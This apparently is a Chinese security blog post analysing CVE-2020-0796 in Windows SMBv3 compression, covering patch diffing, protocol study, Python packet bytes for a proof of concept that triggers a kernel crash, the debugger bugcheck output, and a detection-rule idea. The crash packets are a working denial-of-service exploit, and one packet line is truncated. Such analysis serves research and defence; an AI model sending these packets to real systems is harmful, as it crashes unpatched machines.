@@ -1,0 +1,444 @@
+## **0x00 背景**
+
+2020年3月10日国外安全厂商发布安全通告添加CVE-2020-0796对应IPS规则，描述中认为此漏洞可导致无需认证的远程任意代码执行[1]。
+
+![clipboard.png](https://image.3001.net/images/20200318/1584502944_5e7198a0cb793.png!small)  
+
+大量安全媒体转发此通告，并认为该漏洞可能会像WannaCry一样导致蠕虫式传播。
+
+3月11日补丁日，微软安全应急响应中心发布安全公告ADV200005，在SBMv3(3.1.1)中存在远程代码执行漏洞，未授权用户可通过发送特殊构造的数据包触发该漏洞，导致任意代码执行[2]。防护措施包括通过注册表禁用SMBv3的compression功能，通过防火墙阻断445端口的连接。
+
+从微软公布的信息看，该漏洞的影响范围主要在1903和1903两个版本的Windows系统。
+
+![version.png](https://image.3001.net/images/20200318/1584503122_5e719952651d7.png!small)
+
+3月12日微软紧急发布CVE-2020-0796修复补丁[3].该事件的发展时间线大致如下：
+
+![timeline.png](https://image.3001.net/images/20200318/1584503137_5e7199610c7e8.png!small)  
+
+## 0x01 分析环境搭建及配置
+
+系统版本：cn_windows_10_business_editions_version_1903_updated_nov_2019_x64_dvd_59670fa0.iso
+
+补丁：[windows10.0-kb4551762-x64_dacef156c781f2018d94d5a5286076610ba97279.msu](http://download.windowsupdate.com/d/msdownload/update/software/secu/2020/03/windows10.0-kb4551762-x64_dacef156c781f2018d94d5a5286076610ba97279.msu)
+
+开启网络共享：
+
+打开高级共享设置(设置->状态->网络和共享中心->更改高级共享设置或按下图控制面板路径打开)，启用网络发现、启用文件和打印机共享。
+
+![share.png](https://image.3001.net/images/20200318/1584503201_5e7199a1ede54.png!small)
+
+配置内核调试(虚拟机)：
+
+管理员权限启动powershell或cmd，执行如下命令
+
+    
+    
+    bcdedit /set dbgtransport kdnet.dll
+    bcdedit /dbgsettings NET HOSTIP:192.168.251.1 PORT:50000
+    bcdedit /debug on  
+    
+
+结果如下：
+
+![debug_config.png](https://image.3001.net/images/20200318/1584503257_5e7199d9c90f6.png!small)  
+
+配置内核调试(宿主机):
+
+通过如下命令启动windbg，之后重启虚拟机便可调试内核：
+
+`"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe" -k
+net:port=50000,key=3819081in3qtu.262czeb0c1b8s.1ko3ffst3r2on.2hqmtq03n6eo8`
+
+ps:目前windbg下载符号需挂代理。
+
+测试一下，一切正常，下面就可以愉快的调试了。
+
+![windbg.png](https://image.3001.net/images/20200318/1584503304_5e719a0811111.png!small)  
+
+## 0x02 漏洞成因分析
+
+微软已经发布了补丁，所以可以尝试从补丁对比的角度切入进行分析。之前分析过Shadowbroker放出的NSA方程式组织使用的EternalXXX相关漏洞利用程序，所以大概知道smb
+Server相关的模块在srv*.sys，下面先找一下相关模块，在C:\Windows\system32\drivers\下面找到srvnet.sys和srv2.sys，从命名上看srv2.sys很可能关联smb2相关的实现，在微软的smb2协议文档是这样命名的：[MS-SMB2]: Server Message Block (SMB) Protocol Versions 2 and
+3，所以跟本漏洞相关联的SMBv3(3.1.1)很可能就是在srv2.sys模块实现的。下面补丁对比一下看看。
+
+![diff.png](https://image.3001.net/images/20200318/1584503328_5e719a20016e6.png!small)  
+
+通过fortinet安全通告中的描述大概知道应该和compress相关，在看上面的diff结果，首先详细分析一下Srv2DecompressData。如下图所示，可以看到补丁前分配Buffer是直接通过(unsigned
+int)(Size.m128i_i32[1] +
+v4.m128i_i32[1])计算Buffer大小，通过SrvNetAllocateBuffer进行分配的，补丁后在SrvNetAllocateBuffer分配前对(unsigned
+int)(Size.m128i_i32[1] +
+v4.m128i_i32[1])的值进行了校验，猜测可能上面两个值相加之后存在整数溢出。更进一步的详细分析可以参考360大佬的文章[4]，我后面主要侧重协议分析及poc还原。
+
+![code_diff.jpg](https://image.3001.net/images/20200318/1584503350_5e719a368871f.jpg!small)  
+
+## 0x03 协议分析及poc还原
+
+首先通过一个pcap包看一下smb2的通信流程，这样有一个直观的感受。
+
+![pcap.png](https://image.3001.net/images/20200318/1584504047_5e719cef6c372.png!small)  
+
+然后我们再看一下MS-SMB2协议文档[5]中对SMB2协议描述搞懂上面的每个交互流程到底什么意思。在文档的2.2节开始有协议语法的一个概述及从SMBv2到SMBv3及3.1.1的一个演化概述。
+
+在SMBv2协议中定义了以下内r在SMB2.1中添加了如下内容：
+
+    
+    
+    Protocol negotiation (SMB2 NEGOTIATE) 
+    User authentication (SMB2 SESSION_SETUP, SMB2 LOGOFF) 
+    Share access (SMB2 TREE_CONNECT, SMB2 TREE_DISCONNECT) 
+    File access (SMB2 CREATE, SMB2 CLOSE, SMB2 READ, SMB2 WRITE, SMB2 LOCK, SMB2 IOCTL, SMB2 QUERY_INFO, SMB2 SET_INFO, SMB2 FLUSH, SMB2 CANCEL) 
+    Directory access (SMB2 QUERY_DIRECTORY, SMB2 CHANGE_NOTIFY) 
+    Volume access (SMB2 QUERY_INFO, SMB2 SET_INFO) 
+    Cache coherency (SMB2 OPLOCK_BREAK) 
+    Simple messaging (SMB2 ECHO)   
+    
+
+在SMB2.1中添加了如下内容：
+
+    
+    
+    Protocol Negotiation (SMB2 NEGOTIATE) 
+    Share Access (SMB2 TREE_CONNECT) 
+    File Access (SMB2 CREATE, SMB2 WRITE) 
+    Cache Coherency (SMB2 OPLOCK_BREAK) 
+    Hash Retrieval (SMB2 IOCTL)   
+    
+
+在SMB3.x中添加了如下内容：
+
+    
+    
+    Protocol Negotiation and secure dialect validation (SMB2 NEGOTIATE, SMB2 IOCTL) 
+    Share Access (SMB2 TREE_CONNECT) 
+    File Access (SMB2 CREATE, SMB2 READ, SMB2 WRITE) 
+    Hash Retrieval (SMB2 IOCTL) 
+    Encryption (SMB2 TRANSFORM_HEADER) 
+
+下面重点来了，在SMB3.1.1中添加了如下内容：
+
+    
+    
+    Compression (SMB2 COMPRESSION_TRANSFORM_HEADER)  
+    
+
+这也说明了为什么该漏洞只影响1903和1909版本，因为SMB3.1.1是在1903才引入的。以上对SMB2协议有了一个大概的了解，下面我们根据协议描述、已有的SMB2pcap包和已经掌握的漏洞信息构造一下poc。
+
+首先是NEGOTIATE过程，client端发送一个NEGOTIATE请求，server端回复一个NEGOTIATE响应。参考pcap和协议文档构造的包内容如下：
+
+    
+    
+    # NetBios
+    negotiate_pkt=b'\x00'                  # Message Type
+    negotiate_pkt+=b'\x00\x00\xb2'         # length
+    # SMB2 Header
+    negotiate_pkt+=b'\xfe\x53\x4d\x42'     # ProtocolId
+    negotiate_pkt+=b'\x40\x00'             # StructureSize
+    negotiate_pkt+=b'\x01\x00'             # CreditCharge
+    negotiate_pkt+=b'\x00\x00'             # ChannelSequence
+    negotiate_pkt+=b'\x00\x00'             # Reserved
+    negotiate_pkt+=b'\x00\x00'             # Command
+    negotiate_pkt+=b'\x01\x00'             # CreditRequest
+    negotiate_pkt+=b'\x00\x00\x00\x00'     # Flags
+    negotiate_pkt+=b'\x00\x00\x00\x00'     # NextCommand
+    negotiate_pkt+=b'\x00\x00\x00\x00\x00\x00\x00\x00'     # MessageId 
+    negotiate_pkt+=b'\xff\xfe\x00\x00'     # ProcessId
+    negotiate_pkt+=b'\x00\x00\x00\x00'     # TreeId
+    negotiate_pkt+=b'\x00\x00\x00\x00\x00\x00\x00\x00'     # SessionId
+    negotiate_pkt+=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # Signature
+    # Negotiate Protocol Request
+    negotiate_pkt+=b'\x24\x00'             # StructureSize
+    negotiate_pkt+=b'\x05\x00'             # DialectCount
+    negotiate_pkt+=b'\x01\x00'             # SecurityMode
+    negotiate_pkt+=b'\x00\x00'             # Reserved 
+    negotiate_pkt+=b'\x40\x00\x00\x00'     # Capabilities 
+    negotiate_pkt+=b'\x2d\x4b\x9d\xd7'     #ClientGuid 
+    negotiate_pkt+=b'\x3f\xc0\x75\x4d'
+    negotiate_pkt+=b'\xbd\xdf\x29\x17'
+    negotiate_pkt+=b'\xc7\x68\xf3\x73'
+    negotiate_pkt+=b'\x70\x00\x00\x00'     # NegotiateContextOffset
+    negotiate_pkt+=b'\x02\x00'             # NegotiateContextCount
+    negotiate_pkt+=b'\x00\x00'             # Reserved2
+    negotiate_pkt+=b'\x02\x02'             # Dialect: SMB 2.0.2
+    negotiate_pkt+=b'\x10\x02'             # Dialect: SMB 2.1
+    negotiate_pkt+=b'\x00\x03'             # Dialect: SMB 3.0
+    negotiate_pkt+=b'\x02\x03'             # Dialect: SMB 3.0.2
+    negotiate_pkt+=b'\x11\x03'             # Dialect: SMB 3.1.1
+    negotiate_pkt+=b'\x00\x00'
+        #Negotiate Context: SMB2_PREAUTH_INTEGRITY_CAPABILITIES
+    negotiate_pkt+=b'\x01\x00'             # Type
+    negotiate_pkt+=b'\x26\x00'             # DataLength
+    negotiate_pkt+=b'\x00\x00\x00\x00'     # Reserved
+    negotiate_pkt+=b'\x01\x00'             # HashAlgorithmCount
+    negotiate_pkt+=b'\x20\x00'             # SaltLength
+    negotiate_pkt+=b'\x01\x00'             # HashAlgorithm
+    negotiate_pkt+=b'\x79\xdb\x3d\xcb'     # Salt
+    negotiate_pkt+=b'\xb1\xf0\xe8\xf2'
+    negotiate_pkt+=b'\x4b\xff\xe5\x73'
+    negotiate_pkt+=b'\x4e\xc8\x73\xc8'
+    negotiate_pkt+=b'\x6b\xde\xa0\x88'
+    negotiate_pkt+=b'\x7d\x13\x34\x38'
+    negotiate_pkt+=b'\x6f\x05\xc2\xe1'
+    negotiate_pkt+=b'\x41\x1f\xd3\xec'
+    negotiate_pkt+=b'\x00\x00'
+        #Negotiate Context SMB2_COMPRESSION_CAPABILITIES
+    negotiate_pkt+=b'\x03\x00'             # Type
+    negotiate_pkt+=b'\x0a\x00'             # DataLength
+    negotiate_pkt+=b'\x00\x00\x00\x00'     # Reserved
+    negotiate_pkt+=b'\x01\x00'             # CompressionAlgorithmCount
+    negotiate_pkt+=b'\x00\x00\x00\x00\x00\x00
+    negotiate_pkt+=b'\x02\x00'             # CompressionAlgorithmId  
+    
+
+下面的话就是连接建立及认证的过程，因为微软描述此漏洞未经认证也可实现利用，因此我们推测不需要登陆流程即可构造payload。下面根据2.2.42节中的描述构造一下SMB2
+COMPRESSION_TRANSFORM_HEADER.
+
+![2.2.4.png](https://image.3001.net/images/20200318/1584504909_5e71a04d0676e.png!small)
+
+上图是协议文档中定义的COMPRESSION_TRANSFORM_HEADER：
+
+1.ProtocolId为固定值0x424d53fc
+
+2.OriginalCompressedSegmentSize定义了压缩数据的原始大小
+
+3.CompressionAlgorithm定义了支持的压缩算法，如下图所示：
+
+![compress.png](https://image.3001.net/images/20200318/1584504971_5e71a08b7c042.png!small)
+
+4.Flags分为两种情况：FLAG_NONE和FLAG_CHAINED（为简单起见后面我们选用FLAG_NONE）
+
+5.offset/length：
+
+当选用FLAG_NONE时该处四字节代表offset，offset为从offset所占4字节结束到后面compressed data起始的位置偏移量。
+
+当选用FLAG_CHAINED时该处四字节代表length，length为后面compressed payload的大小（详见2.2.42.2 中的描述）
+
+大概了解了COMPRESSION_TRANSFORM_HEADER的结构，下面对数据包进行构造：
+
+    
+    
+    # NetBios
+    smb2_cth_pkt=b'\x00'                   # Message Type
+    smb2_cth_pkt+=b'\x00\x00\x20'          # length
+    # SMB2 Compression Transform Header
+    smb2_cth_pkt+=b'\xfc\x53\x4d\x42'      # ProtocolId
+    smb2_cth_pkt+=b'\x1f\x00\x00\x00'      # OriginalCompressedSegmentSize
+    smb2_cth_pkt+=b'\x02\x00'              # CompressionAlgorithm Lz77
+    smb2_cth_pkt+=b'\x00\x00'              # flags
+    smb2_cth_pkt+=b'\x00\x00\x00\x00'      # offset
+        # compressed smb3 data
+    smb2_cth_pkt+=b'\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f'  
+    
+
+因为不知道压缩算法的具体实现，暂且定义一个b'\x11\x12\x13\x14\x15\x16\x17\x18\x19\x20'的数据，OriginalCompressedSegmentSize的值暂且定义为比压缩数据大的值。下面发送以下数据包看是否能够命中函数Srv2DecompressData。下断点
+
+    
+    
+    bm Srv2DecompressData  
+    
+
+执行：
+
+![dbg.png](https://image.3001.net/images/20200318/1584505032_5e71a0c8154b4.png!small)  
+
+构造的没错，在Srv2DecompressData处断下来了。下面调试跟踪一下该函数的处理流程。
+
+在srv2+17ec8 mov rax, qword ptr [rsp+30h]处，查看rsp+30为：
+
+![rspand30.png](https://image.3001.net/images/20200318/1584505060_5e71a0e47882c.png!small)
+
+看起来像是数据包中定义的头部，在call cs:__imp_SrvNetAllocateBuffer处(bp
+srv2+17ed9)查看ecx为1f，推测SrvNetAllocateBuffer的参数为OriginalCompressedSegmentSize+offset，下面验证一下，将offset由0x00改为0x11
+
+![rever.png](https://image.3001.net/images/20200318/1584505124_5e71a12459353.png!small)
+
+看来SrvNetAllocateBuffer的参数确实为OriginalCompressedSegmentSize+offset。前面文档中描述offset是用来确定compressed数据位置的，补丁对OriginalCompressedSegmentSize+offset做了限制，如果构造一下先往下继续分析OriginalCompressedSegmentSize+offset使得结果比OriginalCompressedSegmentSize还小会不会发生溢出？待会儿看看。
+
+下面分析一下SmbCompressionDecompress的参数，在srv2+17f35 call
+cs:__imp_SmbCompressionDecompress处断下：
+
+经过分析发现第一个参数为压缩算法类型，第二个参数为压缩数据：
+
+![header.png](https://image.3001.net/images/20200318/1584505154_5e71a142ba161.png!small)
+
+对SmbCompressionDecompress做进一步分析还是需要把压缩算法实现一下。经过上面大概的分析，感觉距离poc已经不远了。下面我们把offset调整为0xFFFFFFFF看一下，真的触发了崩溃。
+
+![bsod.png](https://image.3001.net/images/20200318/1584505176_5e71a15847e60.png!small)  
+
+现场信息如下：
+
+    
+    
+    1: kd> !analyze -v
+    *******************************************************************************
+    *                                                                             *
+    *                        Bugcheck Analysis                                    *
+    *                                                                             *
+    *******************************************************************************
+    
+    PAGE_FAULT_IN_NONPAGED_AREA (50)
+    Invalid system memory was referenced.  This cannot be protected by try-except.
+    Typically the address is just plain bad or it is pointing at freed memory.
+    Arguments:
+    Arg1: ffff96820828f58f, memory referenced.
+    Arg2: 0000000000000000, value 0 = read operation, 1 = write operation.
+    Arg3: fffff8027275e350, If non-zero, the instruction address which referenced the bad memory
+    	address.
+    Arg4: 0000000000000002, (reserved)
+    
+    Debugging Details:
+    ------------------    
+    
+    KEY_VALUES_STRING: 1
+    
+        Key  : Analysis.CPU.Sec
+        Value: 6
+    
+        Key  : Analysis.DebugAnalysisProvider.CPP
+        Value: Create: 8007007e on DESKTOP-N6TEJ3V
+    
+        Key  : Analysis.DebugData
+        Value: CreateObject
+    
+        Key  : Analysis.DebugModel
+        Value: CreateObject
+    
+        Key  : Analysis.Elapsed.Sec
+        Value: 6
+    
+        Key  : Analysis.Memory.CommitPeak.Mb
+        Value: 107
+    
+        Key  : Analysis.System
+        Value: CreateObject
+    
+    
+    ADDITIONAL_XML: 1
+    
+    BUGCHECK_CODE:  50
+    
+    BUGCHECK_P1: ffff96820828f58f
+    
+    BUGCHECK_P2: 0
+    
+    BUGCHECK_P3: fffff8027275e350
+    
+    BUGCHECK_P4: 2
+    
+    READ_ADDRESS:  ffff96820828f58f Nonpaged pool
+    
+    MM_INTERNAL_CODE:  2
+    
+    PROCESS_NAME:  System
+    
+    TRAP_FRAME:  fffffc08cef3dc00 -- (.trap 0xfffffc08cef3dc00)
+    NOTE: The trap frame does not contain all registers.
+    Some register values may be zeroed or incorrect.
+    rax=fffff8027275e300 rbx=0000000000000000 rcx=ffff9682047ba04f
+    rdx=ffff9682047ba04f rsi=0000000000000000 rdi=0000000000000000
+    rip=fffff8027275e350 rsp=fffffc08cef3dd98 rbp=ffff9682047ba04f
+     r8=ffff96820828f58f  r9=0000000000000011 r10=ffff9682047b9f0e
+    r11=ffff96820828f5a0 r12=0000000000000000 r13=0000000000000000
+    r14=0000000000000000 r15=0000000000000000
+    iopl=0         nv up ei pl zr na po nc
+    nt!RtlDecompressBufferXpressLz+0x50:
+    fffff802`7275e350 418b08          mov     ecx,dword ptr [r8] ds:ffff9682`0828f58f=????????
+    Resetting default scope
+    
+    STACK_TEXT:  
+    fffffc08`cef3d1b8 fffff802`728a9622 : ffff9682`0828f58f 00000000`00000003 fffffc08`cef3d320 fffff802`7271dbc0 : nt!DbgBreakPointWithStatus
+    fffffc08`cef3d1c0 fffff802`728a8d12 : fffff802`00000003 fffffc08`cef3d320 fffff802`727d5c60 00000000`00000050 : nt!KiBugCheckDebugBreak+0x12
+    fffffc08`cef3d220 fffff802`727c1617 : fffff802`72a66478 fffff802`728d31b5 ffff9682`0828f58f ffff9682`0828f58f : nt!KeBugCheck2+0x952
+    fffffc08`cef3d920 fffff802`727e36d6 : 00000000`00000050 ffff9682`0828f58f 00000000`00000000 fffffc08`cef3dc00 : nt!KeBugCheckEx+0x107
+    fffffc08`cef3d960 fffff802`72672eef : ffff6ed2`42811240 00000000`00000000 00000000`00000000 ffff9682`0828f58f : nt!MiSystemFault+0x1d6966
+    fffffc08`cef3da60 fffff802`727cf620 : ffff9681`04050fe0 ffff9681`04041fe0 00000000`00000000 00000000`00000fe0 : nt!MmAccessFault+0x34f
+    fffffc08`cef3dc00 fffff802`7275e350 : ffff9682`0828f58f ffff9682`047ba04f fffff802`72730326 ffff9682`047ba04f : nt!KiPageFault+0x360
+    fffffc08`cef3dd98 fffff802`72730326 : ffff9682`047ba04f 00000000`0000001f fffffc08`cef3ded0 ffff9681`04042000 : nt!RtlDecompressBufferXpressLz+0x50
+    fffffc08`cef3ddb0 fffff802`790ce58d : 00000000`00000003 00000000`00000011 00000000`ffffffff fffff802`00000000 : nt!RtlDecompressBufferEx2+0x66
+    fffffc08`cef3de00 fffff802`717f7f41 : ffff9681`0000ef27 ffff9681`047bb150 00000000`00000002 00000000`ffffffff : srvnet!SmbCompressionDecompress+0xdd
+    fffffc08`cef3de70 fffff802`717f699e : 00000000`00000000 ffff9681`0828f010 00000000`00000013 ffffffff`ffffffff : srv2!Srv2DecompressData+0xe1
+    fffffc08`cef3ded0 fffff802`71839a9f : ffff9681`0828f020 ffff9681`0362f601 00000000`00000000 fffff802`7272ce00 : srv2!Srv2DecompressMessageAsync+0x1e
+    fffffc08`cef3df00 fffff802`727c4dde : fffffc08`cef30050 fffffc08`ce7ada01 ffffffff`ee1e5d00 fffffc08`cef3dfd1 : srv2!RfspThreadPoolNodeWorkerProcessWorkItems+0x13f
+    fffffc08`cef3df80 fffff802`727c4d9c : fffffc08`cef3dfd1 ffff9681`0362f6c0 fffffc08`cef3e000 fffff802`7266a16e : nt!KxSwitchKernelStackCallout+0x2e
+    fffffc08`ce7ad970 fffff802`7266a16e : fffffc08`cef3dfd1 fffffc08`cef3e000 00000000`00000000 00000000`00000000 : nt!KiSwitchKernelStackContinue
+    fffffc08`ce7ad990 fffff802`72669f6c : fffff802`71839960 ffff9681`08ef8c10 00000000`00000002 00000000`00000000 : nt!KiExpandKernelStackAndCalloutOnStackSegment+0x18e
+    fffffc08`ce7ada30 fffff802`72669de3 : 00000000`00000080 00000000`00000088 ffff9681`0362f6c0 fffffc08`ce7adb80 : nt!KiExpandKernelStackAndCalloutSwitchStack+0xdc
+    fffffc08`ce7adaa0 fffff802`72669d9d : fffff802`71839960 ffff9681`08ef8c10 ffff9681`08ef8c10 00000000`00000088 : nt!KeExpandKernelStackAndCalloutInternal+0x33
+    fffffc08`ce7adb10 fffff802`718397f7 : ffff9681`00000000 00000000`00000000 ffffb30a`8af7a8e0 00000000`00000000 : nt!KeExpandKernelStackAndCalloutEx+0x1d
+    fffffc08`ce7ad*** fffff802`72d19b37 : 00000000`00000000 ffff9681`0362f6c0 00000000`00000000 00000000`00000000 : srv2!RfspThreadPoolNodeWorkerRun+0x117
+    fffffc08`ce7adbb0 fffff802`7272a7b5 : ffff9681`0362f6c0 fffff802`72d19b00 ffffb30a`8af7a8e0 00000000`00000001 : nt!IopThreadStart+0x37
+    fffffc08`ce7adc10 fffff802`727c8b5a : ffffd481`bd383180 ffff9681`0362f6c0 fffff802`7272a760 00000000`00000246 : nt!PspSystemThreadStartup+0x55
+    fffffc08`ce7adc60 00000000`00000000 : fffffc08`ce7ae000 fffffc08`ce7a8000 00000000`00000000 00000000`00000000 : nt!KiStartSystemThread+0x2a
+    
+    
+    SYMBOL_NAME:  srvnet!SmbCompressionDecompress+dd
+    
+    MODULE_NAME: srvnet
+    
+    IMAGE_NAME:  srvnet.sys
+    
+    STACK_COMMAND:  .thread ; .cxr ; kb
+    
+    BUCKET_ID_FUNC_OFFSET:  dd
+    
+    FAILURE_BUCKET_ID:  AV_R_INVALID_srvnet!SmbCompressionDecompress
+    
+    OS_VERSION:  10.0.18362.1
+    
+    BUILDLAB_STR:  19h1_release
+    
+    OSPLATFORM_TYPE:  x64
+    
+    OSNAME:  Windows 10
+    
+    FAILURE_ID_HASH:  {4320f3dd-f397-f147-9d97-e2ca1e080673}
+    
+    Followup:     MachineOwner
+    ---------  
+    
+
+虽然bsod了，但是感觉不够完美，下面构造一个更好一点的poc，把加密这部分实现一下，搜索了几个开源项目，构造了一些压缩数据，但是Windows并没有解压成功，看了一下官方文档[6]，里面有微软实现算法的详细介绍，懒得自己写了，直接拿数据来用吧。
+
+![compress_example.png](https://image.3001.net/images/20200318/1584505230_5e71a18e513cc.png!small)  
+
+构造如下数据包，测试成功：
+
+    
+    
+    # NetBios
+    smb2_cth_pkt=b'\x00'                   # Message Type
+    smb2_cth_pkt+=b'\x00\x00\x2e'          # length
+    # SMB2 Compression Transform Header
+    smb2_cth_pkt+=b'\xfc\x53\x4d\x42'      # ProtocolId
+    smb2_cth_pkt+=b'\x1a\x00\x00\x00'      # OriginalCompressedSegmentSize
+    smb2_cth_pkt+=b'\x02\x00'              # CompressionAlgorithm
+    smb2_cth_pkt+=b'\x00\x00'              # flags
+    smb2_cth_pkt+=b'\x00\x00\x00\x00'      # offset
+        # compressed smb3 data
+    smb2_cth_pkt+=b'\x3f\x00\x00\x00\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a'
+
+可以通过调整offset和OriginalCompressedSegmentSize的大小构造poc，触发bsod。
+
+## 0x04 扫描插件及防护规则的一点思考
+
+扫描插件：不触发bsod的无损扫描插件开发起来难度还是挺大的(或许某些大佬能够搞定)。
+
+防护规则：网络流量中根据ProtocolId识别SMB2 Compression Transform
+Header，识别到之后做一下解析提取OriginalCompressedSegmentSize和offset,如果两者相加小于OriginalCompressedSegmentSize或offset，即发生了溢出，可以认为包含攻击特征。
+
+## Reference:
+
+[1]
+[https://fortiguard.com/encyclopedia/ips/48773](https://fortiguard.com/encyclopedia/ips/48773)
+
+[2] [https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV200005](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV200005)
+
+[3] [https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796)
+
+[4]
+[http://blogs.360.cn/post/CVE-2020-0796.html?from=singlemessage&isappinstalled=0](http://blogs.360.cn/post/CVE-2020-0796.html?from=singlemessage&isappinstalled=0)
+
+[5] [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962)
+
+[6] [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-xca/a8b7cb0a-92a6-4187-a23b-5e14273b96f8](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-xca/a8b7cb0a-92a6-4187-a23b-5e14273b96f8)
+
